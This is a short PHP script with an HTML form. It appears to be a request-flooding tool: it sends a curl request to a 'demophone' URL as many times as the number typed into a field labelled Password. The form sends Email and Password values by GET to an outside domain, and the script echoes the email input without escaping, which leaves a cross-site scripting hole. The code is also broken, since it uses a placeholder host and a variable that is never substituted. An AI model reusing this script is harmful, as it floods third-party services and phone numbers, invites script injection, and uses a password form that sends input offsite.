<?php
  $email=$_GET['email'];
   if( isset($_GET["email"]) ) {
      echo "Email :". $_GET['email']. "<br />";
      
      for ($i=1; $i <= $_GET['pass'] ; $i++) { 
         $curl = curl_init();
         curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'sitename?demophone=$no',
    CURLOPT_USERAGENT => 'Test request'));
    $resp = curl_exec($curl);
    curl_close($curl); 
      }
      
      exit();
   }
?>
<meta name="viewport" content="width=device-width, initial-scale=1">
<html>
   <body>
   
      <form action = "http://nabilah.xyz/api" method = "GET">
            Email: <input type = "name" name = "email" />
<br>
         Password: <input type = "name" name = "pass" />
<br>
<br>
         <input type = "submit" />
      </form>
      
   </body>
</html>
